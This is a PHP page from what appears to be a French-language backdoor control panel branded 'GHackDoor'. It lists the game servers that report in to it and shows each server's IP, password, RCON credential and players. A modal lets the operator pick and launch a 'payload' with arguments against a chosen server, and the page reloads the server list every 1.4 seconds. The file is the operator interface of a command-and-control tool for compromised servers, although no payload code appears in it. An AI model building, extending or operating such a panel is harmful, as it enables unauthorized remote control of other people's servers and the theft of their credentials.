<?php
include 'core/class/include.php';
$ip = $_SERVER['REMOTE_ADDR'];
    if(BanIP::IsBanned($_SERVER["REMOTE_ADDR"]))
  {
    die("Vous êtes banni IP, venez sur le discord pour vous faire debannir https://discord.gg/rVbb2Kx");
  }
// Redirige l'utilisateur si il n'est pas authentifier
if (!Account::isAuthentified())
{
    header('Location: fe15hg6rt1e.php');

    exit();
}

 $color = Account::GetUser()["color"]; 
  $colort = Account::GetUser()["color_second"]; 
 $colorb = Account::GetUser()["color_trois"]; 
 if($colorb == "")
     $colorb = "1a6d7d";
  if($colort == "")
 $colort = "ffffff";
 if($color == "")
 $color = "1c1c1c";
?>

<!DOCTYPE html>
<html lang="en">
<style>
th {
  cursor: pointer;
}
</style>
<script src="https://www.w3schools.com/lib/w3.js"></script>
<?php
include 'defaultpage.php';
?>

<body id="page-top">



  <!-- Page Wrapper -->
  <div id="wrapper">
  <?php
  include 'defaultnav.php';
  ?>

    <!-- Content Wrapper -->
    <div id="content-wrapper" class="d-flex flex-column">

      <!-- Main Content -->
      <div id="content">
<?php
        include 'defaultnavbar.php';
        ?>

        <!-- Begin Page Content -->
        <div class="container-fluid">

          <!-- Page Heading -->

<div class="card shadow mb-4">
                <div class="card-header py-3">
                  <h6 class="m-0 font-weight-bold text-primary">Serveurs</h6>
                </div>
                <div class="card-body">
          <div id="server_pfwcejzfn">
    <table id="server_lisst" cellspacing="0" width="100%" <?php echo 'class="table table-' . Account::GetUser()["color_trois"] . ' table-striped"' ?> class="table table- table-striped">
        <thead> 
            <tr>
                <th><?php echo $lang["servername"]; ?></th>
                <th><?php echo $lang["ipaddress"]; ?></th>
                <th>Port</th>
                <th><?php echo $lang["users"]; ?></th>
                <th><?php echo $lang["lastpingdate"]; ?></th>
                <th><?php echo $lang["owner"]; ?></th>
                <th style="min-width: 140px!important;">Action</th>
            </tr>
        </thead>

        <tbody id="ilyadesserveurs">
        	<?php 
        	$selectionserver = Server::GetAllServer();

                        
                    // Print Output
                    foreach($selectionserver as $AfficheServer)
                    {
                    if ($AfficheServer['last_update'] + 30 > time())
    {
                    if($_SESSION['id'] == $AfficheServer['userid'] || IsAdmin($_SESSION['id'])){
                     $button_hearth_console = '<button onclick="showserverboii('.$AfficheServer['id'].')" type="button" class="btn btn-primary btn-sm"><i class="	fas fa-clone"></i></button>';
                     $ip_data = explode(':', $AfficheServer['server_ip']);
                        echo 
                        "
                            <tr class='item'>
                                <td><b>" . htmlspecialchars($AfficheServer['server_name']) . "</b></td>
                                <td><b>" . htmlspecialchars($ip_data[0]) . "</b></td>
                                <td><b>" . htmlspecialchars($ip_data[1]) . "</b></td>
                                <td><b>" . htmlspecialchars($AfficheServer['server_users']) . "</b></td>
                                <td><b>" . htmlspecialchars(date('d/m/Y à H:i:s', $AfficheServer['last_update'])) . "</b></td>
                                <td><b>" . Account::GetUsername($AfficheServer['userid']) . "</b></td>
                                <td><b>" . $button_hearth_console . "</b></td>
                            </tr>
                        ";
                        } 
                    }
                    }
        	?>
        </tbody>
    </table>
    </div>
</div>
</div>

<!-- Modal définition du payload -->
<div class="modal fade" id="serverpayload-modal" tabindex="-1" role="dialog">
  <div class="modal-dialog" role="document">
    <div class="modal-content" style="color:white; background-color: #1c1c1c;">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
        <h4 class="modal-title">Charger un Payload</h4>
      </div>
      <div class="modal-body" id="serverpayload-body">
          <div class="form-group">
            <label>Payload</label>
            <select class="form-control" id="server-payload">
            </select>
          </div>
          <div class="form-group">
            <label>Mode d'argument</label>
            <select class="form-control" id="server-payload-arg-mode">
              <option value="texte">Argument texte</option>
              <optgroup label="Joueurs" id="optgroupplayers">
              </optgroup>
            </select>
          </div>
          <div class="form-group">
            <label>Argument</label>
            <textarea class="form-control" rows="3" id="server-payload-arg" placeholder="Argument du payload"></textarea>
          </div>
      </div>
      <div class="modal-footer" id="serverpayload-footer">
        <button type="button" class="btn btn-danger" data-dismiss="modal">Annuler</button>
        <button type="button" onclick="callPayload()" class="btn btn-primary">Charger le Payload</button>
      </div>
    </div>
  </div>
</div>


<div class="modal fade" id="serverinformation-modal" tabindex="-1" role="dialog">
  <div class="modal-dialog" role="document">
    <div class="modal-content" style="color:white; background-color: #1c1c1c;">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
        <h4 class="modal-title">Information sur le server</h4>
      </div>
      <div class="modal-body" id="serverinformation-body">
          <div class="form-group">
            <label>Nom</label>
            <textarea disabled="" class="form-control" rows="1" id="server-name" placeholder="nom du server"></textarea>
          </div>
          <div class="form-group">
            <label>IP</label>
            <textarea disabled="" class="form-control" rows="1" id="server-ip" placeholder="ip du server"></textarea>
          </div>
          <div class="form-group">
            <label>Map</label>
            <textarea disabled="" class="form-control" rows="1" id="server-map" placeholder="map du server"></textarea>
          </div>
          <div class="form-group">
            <label>Mode de jeux</label>
            <textarea disabled="" class="form-control" rows="1" id="server-gm" placeholder="gamemode du server"></textarea>
          </div>
          <div class="form-group">
            <label>Mot de passe</label>
            <textarea disabled="" class="form-control" rows="1" id="server-pw" placeholder="Le server na pas de mot de passe"></textarea>
          </div>

          <div class="form-group">
            <label>Rcon</label>
            <textarea disabled="" class="form-control" rows="1" id="server-rcon" placeholder="Le server na pas de RCON"></textarea>
          </div>

          <div class="form-group">
            <a id="secoauserver" href="#">Cliquer ici pour vous connecter au server</a>
          </div>

          <div class="form-group">
            <label>Liste des joueurs</label>
            <textarea disabled="" class="form-control" rows="8" id="server-players" placeholder="Aucun joueurs"></textarea>
          </div>


      </div>
      <div class="modal-footer" id="serverinformation-footer">
        <button type="button" class="btn btn-danger" data-dismiss="modal">Fermer</button>
      </div>
    </div>
  </div>
</div>

<div class="modal fade" id="serverconsole-modal" tabindex="-1" role="dialog">
  <div class="modal-dialog" role="document">
    <div class="modal-content" style="color:white; background-color: #1c1c1c;">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
        <h4 class="modal-title">Console du serveur</h4>
      </div>
      <div class="modal-body" id="serverinformation-body">
          <div class="form-group">
            <label>Console:</label>
            <textarea disabled="" class="form-control" rows="5" id="server-console" placeholder="ERREUR"></textarea>
          </div>


      </div>
      <div class="modal-footer" id="serverinformation-footer">
        <button type="button" class="btn btn-danger" data-dismiss="modal">Fermer</button>
      </div>
    </div>
  </div>

        </div>
        <!-- /.container-fluid -->

      </div>
      <!-- End of Main Content -->

      <!-- Footer -->
      <footer class="sticky-footer bg-white">
        <div class="container my-auto">
          <div class="copyright text-center my-auto">
            <span>Copyright &copy; GHackDoor 2019</span>
          </div>
        </div>
      </footer>
      <!-- End of Footer -->

    </div>
    <!-- End of Content Wrapper -->

  </div>
  <!-- End of Page Wrapper -->

  <!-- Scroll to Top Button-->
  <a class="scroll-to-top rounded" href="#page-top">
    <i class="fas fa-angle-up"></i>
  </a>

  <!-- Logout Modal-->
    <div class="modal fade" id="logoutModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
    <div class="modal-dialog" role="document">
      <div class="modal-content">
        <div class="modal-header">
          <h5 class="modal-title" id="exampleModalLabel">Etes vous sur de vouloir vous déconnecter ?</h5>
          <button class="close" type="button" data-dismiss="modal" aria-label="Close">
            <span aria-hidden="true">×</span>
          </button>
        </div>
        <div class="modal-body">Cliquer sur "Deconnexion" pour vous déconnecter.</div>
        <div class="modal-footer">
          <button class="btn btn-secondary" type="button" data-dismiss="modal">Annulé</button>
          <a class="btn btn-primary" href="logout.php">Deconnexion</a>
        </div>
      </div>
    </div>
  </div>

  <!-- Bootstrap core JavaScript-->
  <script src="vendor/jquery/jquery.min.js"></script>
  <script src="vendor/bootstrap/js/bootstrap.bundle.min.js"></script>

  <!-- Core plugin JavaScript-->
  <script src="vendor/jquery-easing/jquery.easing.min.js"></script>

  <!-- Custom scripts for all pages-->
  <script src="js/sb-admin-2.min.js"></script>

</body>

<script src="js/jquery.min.js"></script>
<script src="js/bootstrap.min.js"></script>
<script src="js/jquery.dataTables.js"></script>
<script src="js/datatables.bootstrap.js"></script>
<script src="js/custom.js"></script>
<script>
  function copyToClipboard(element) {
  var $temp = $("<input>");
  $("body").append($temp);
  $temp.val($(element).text()).select();
  document.execCommand("copy");
  $temp.remove();
}
let tid = "#server_lisst";
let headers = document.querySelectorAll(tid + " th");

headers.forEach(function(element, i) {
  element.addEventListener("click", function() {
    w3.sortHTML(tid, ".item", "td:nth-child(" + (i + 1) + ")");
  });
});
setTimeout(function() {
	if(window.location.hash)
{
	console.log(window.location.hash);
	showserverboii(window.location.hash.replace("#", ""));
}
}, 100);
</script>
<script>
	setInterval('load_servers()', 1400);
   function load_servers() {
     $('#ilyadesserveurs').load('listed_ki_tue.php?theget=1');
   }
</script>
</html>
